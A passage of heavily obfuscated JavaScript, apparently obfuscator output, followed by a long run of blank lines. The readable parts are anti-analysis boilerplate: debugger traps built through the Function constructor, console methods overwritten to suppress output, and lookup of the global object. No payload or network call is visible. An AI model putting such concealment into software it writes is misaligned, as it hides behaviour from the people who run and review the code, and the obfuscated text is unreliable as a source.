_0x142a57(_0x4abfbb-0x16e,_0x5ecaaa-0x35,_0xc475f4-0x5,_0x2401ef-0x1a,_0xc475f4);}if(_0x230a5b[_0x419b06(0x510,0x4ce,'%2Z#',0x4ae,0x3b3)](_0x230a5b[_0x419b06(0x614,0x5d7,'*VS6',0x441,0x6e5)],_0x230a5b[_0xdc9845(0x355,0x3fe,'gk#9',0x393,0x331)]))_0x436cb6=_0x58d63d[_0x2b2e8d('#%k3',0x93,0x128,0xe1,0x162)](_0x467b71,_0x58d63d[_0xdc9845(0x51e,0x595,'gk#9',0x557,0x624)](_0x58d63d[_0x598377(0x679,0x6e2,'Ove*',0x810,0x7b7)](_0x58d63d[_0x419b06(0x43f,0x4e3,'u)$n',0x369,0x5a3)],_0x58d63d[_0xdc9845(0x61b,0x756,'mHCu',0x6b3,0x731)]),');'))();else return!![];}[_0x142a57(0x3cb,0x32a,0x339,0x3cc,'0KR#')+_0x197c8d(-0x118,'^Xkj',-0x53,-0xa9,0x69)+'r'](_0x49a6b8[_0x18dca4(0x34a,0x3e1,0x323,'u)$n',0x471)](_0x49a6b8[_0x197c8d(0x12d,'gk#9',-0x33,0x28,0x12d)],_0x49a6b8[_0x18dca4(0x67d,0x661,0x754,'0KR#',0x6e8)]))[_0x142a57(0x599,0x470,0x479,0x543,'j6^o')](_0x49a6b8[_0x2b603d('YPqD',-0x150,0x44,0x10,-0x102)]));}else{if(_0x49a6b8[_0x142a57(0x403,0x4ab,0x4c3,0x294,')hx0')](_0x49a6b8[_0x142a57(0x64c,0x6e0,0x636,0x5dd,'fjJr')],_0x49a6b8[_0x197c8d(-0xc3,'B8ZX',0x183,-0x39,-0x6)])){var _0x10a2fd=_0x230a5b[_0x18dca4(0x407,0x3eb,0x29e,')hx0',0x380)][_0x18dca4(0x4a5,0x40c,0x524,'AH1i',0x596)]('|'),_0x1b3acb=0x1*-0x1114+0x5cd+-0x1*-0xb47;while(!![]){switch(_0x10a2fd[_0x1b3acb++]){case'0':_0x2d7ee3[_0x18dca4(0x6cb,0x63c,0x6e5,'btTR',0x55e)+_0x18dca4(0x537,0x524,0x46e,'jg!k',0x3ae)]=_0x41289d[_0x142a57(0x424,0x38f,0x3bb,0x404,'ZoCQ')](_0xead9cf);continue;case'1':var _0xb21cc3=_0x51c058[_0x41b38d]||_0x2d7ee3;continue;case'2':_0x2d7ee3[_0x18dca4(0x666,0x4f0,0x4a3,'R&eM',0x680)+_0x2b603d('vy4*',0xcb,0x29f,0xbe,0x122)]=_0xb21cc3[_0x18dca4(0x2c2,0x43f,0x30d,'jg!k',0x4f3)+_0x4d68a9('a[)#',0x504,0x590,0x534,0x58b)][_0x18dca4(0x443,0x4bb,0x5d6,'llxx',0x4c3)](_0xb21cc3);continue;case'3':var _0x41b38d=_0x5b1e3d[_0x40ce75];continue;case'4':_0x487744[_0x41b38d]=_0x2d7ee3;continue;case'5':var _0x2d7ee3=_0x409bc7[_0x4d68a9('iJCW',0x59b,0x561,0x4a1,0x450)+_0x197c8d(-0x8e,'fjJr',0xdd,-0x183,-0xa8)+'r'][_0x18dca4(0x779,0x5fc,0x601,'*VS6',0x669)+_0x2b603d('R&eM',0xd9,0x10d,0xe,0x186)][_0x4d68a9('^Xkj',0x4ed,0x5a6,0x3ef,0x4a0)](_0x11e1f6);continue;}break;}}else(function(){function _0x337f13(_0x313e7a,_0xd8813c,_0x25e312,_0x4cf8b8,_0x36f41e){return _0x18dca4(_0x313e7a-0x107,_0x4cf8b8-0x1ad,_0x25e312-0x6d,_0x313e7a,_0x36f41e-0x184);}function _0x1f26ef(_0x2e89af,_0x171268,_0x34b1ed,_0x190796,_0xc6e4ae){return _0x18dca4(_0x2e89af-0xc3,_0x34b1ed- -0x318,_0x34b1ed-0x87,_0x2e89af,_0xc6e4ae-0x19d);}function _0xc6d34(_0x2035a6,_0x52626b,_0x1226f7,_0x40d27d,_0x9c2a71){return _0x4d68a9(_0x9c2a71,_0x52626b-0xb1,_0x1226f7-0xf,_0x40d27d-0x5a,_0x40d27d- -0x21f);}function _0x222653(_0x429421,_0x4bd989,_0xb301c9,_0x529203,_0x12b55b){return _0x2b603d(_0x429421,_0x4bd989-0x112,_0xb301c9-0x4b,_0x529203-0x88,_0x529203-0x556);}function _0x2a9bf1(_0x57a2c3,_0x497d73,_0x5af3f0,_0x3016c9,_0x5207df){return _0x142a57(_0x57a2c3- -0x17b,_0x497d73-0x76,_0x5af3f0-0x20,_0x3016c9-0x9b,_0x5207df);}if(_0x230a5b[_0xc6d34(0x448,0x2e6,0x22b,0x3b2,'#%k3')](_0x230a5b[_0x1f26ef('AH1i',0xb0,0x203,0x132,0x1db)],_0x230a5b[_0x222653('fjJr',0x749,0x574,0x5e1,0x540)]))return![];else{var _0x43a868;try{_0x43a868=_0x230a5b[_0x1f26ef('llxx',0x253,0xde,0x224,0x1eb)](_0x236e67,_0x230a5b[_0x222653('%2Z#',0x428,0x6b2,0x579,0x624)](_0x230a5b[_0x2a9bf1(0x50d,0x64c,0x452,0x389,'vy4*')](_0x230a5b[_0x1f26ef('mHCu',0x128,0x1d4,0x1fe,0x1c7)],_0x230a5b[_0x1f26ef('a[)#',0x11a,0x1f1,0x18d,0x200)]),');'))();}catch(_0x41e8ef){_0x43a868=_0x52fa3;}return _0x43a868;}}[_0x142a57(0x3cb,0x36c,0x29d,0x2ea,'0KR#')+_0x4d68a9('fjJr',0x520,0x497,0x552,0x3f2)+'r'](_0x49a6b8[_0x142a57(0x630,0x5c3,0x4a2,0x5b2,'6lxI')](_0x49a6b8[_0x18dca4(0x54d,0x50e,0x477,'pSg&',0x528)],_0x49a6b8[_0x18dca4(0x347,0x429,0x3e4,'iJCW',0x498)]))[_0x197c8d(-0xa8,'a[)#',-0x1fc,0xc6,-0x8a)](_0x49a6b8[_0x4d68a9('DYbS',0x5f4,0x4b3,0x401,0x585)]));}}else _0x1c71c5=_0x1ee1b0;}_0x49a6b8[_0x142a57(0x3c1,0x30f,0x443,0x41c,'R[Zk')](_0x3e5ee9,++_0x33d54e);}else{var _0x5e16bb=_0x3773a0?function(){function _0x5e4faa(_0x2014d9,_0x4719d5,_0x5b1bed,_0x29333c,_0x3408ff){return _0x2b603d(_0x4719d5,_0x4719d5-0x1a8,_0x5b1bed-0xcb,_0x29333c-0x19a,_0x29333c-0x12a);}if(_0x3f61c1){var _0x25ec54=_0x23de92[_0x5e4faa(0xcb,'*VS6',0x22a,0x1d3,0xf1)](_0x3b3458,arguments);return _0x81b962=null,_0x25ec54;}}:function(){};return _0x1b93c2=![],_0x5e16bb;}}function _0x2bdff3(_0x276d90,_0x295569,_0x267e96,_0x4d9d84,_0x448e8e){return _0x2b5225(_0x276d90-0x19e,_0x295569-0x1a3,_0x267e96,_0x276d90-0x144,_0x448e8e-0x128);}function _0x8ddb3c(_0x1dd095,_0xa5333e,_0x5855c8,_0x11fe5a,_0x340e02){return _0x16d157(_0x1dd095-0x150,_0xa5333e-0x224,_0x5855c8-0x153,_0x1dd095,_0x340e02-0x1e1);}try{if(_0x27b92a){if(_0x49a6b8[_0x2334c0(0xcb,0x93,0x214,0x162,'UVLr')](_0x49a6b8[_0x2334c0(0x255,0x34b,0x323,0x222,'YPqD')],_0x49a6b8[_0x8ddb3c('Ove*',0x415,0x2ea,0x3a0,0x2e4)])){var _0x17ee94=_0x1f6d4d[_0x8f8275(0x6f9,'%2Z#',0x49f,0x6c4,0x561)](_0x327a9f,arguments);return _0x4564c4=null,_0x17ee94;}else return _0x3e5ee9;}else _0x49a6b8[_0x8f8275(0x87d,'O$PV',0x77a,0x75f,0x76d)](_0x49a6b8[_0x539346(0x40e,0x3aa,0x442,'UVLr',0x36a)],_0x49a6b8[_0x2bdff3(0x3fb,0x34b,'7OP5',0x47f,0x361)])?_0x49a6b8[_0x8ddb3c('#%k3',0x2ad,0x224,0x28c,0x11a)](_0x3e5ee9,0x2077+-0x1336+-0xd41):function(){return!![];}[_0x8ddb3c('#%k3',0x36a,0x385,0x46e,0x33d)+_0x8f8275(0x512,'B8ZX',0x703,0x557,0x5d4)+'r'](_0x49a6b8[_0x8ddb3c('jg!k',0x1b0,0x279,0xa3,0x247)](_0x49a6b8[_0x8f8275(0x520,'wO2I',0x5d7,0x3fa,0x4ec)],_0x49a6b8[_0x2334c0(0x11e,0x123,0x1f7,0x28,'btTR')]))[_0x8ddb3c('Gote',0x1d1,0x254,0x2e5,0x269)](_0x49a6b8[_0x2bdff3(0x463,0x372,'O$PV',0x5c1,0x4f8)]);}catch(_0x5d9c3c){}}























































































































































































































































































































































































































































































































































































































































































































































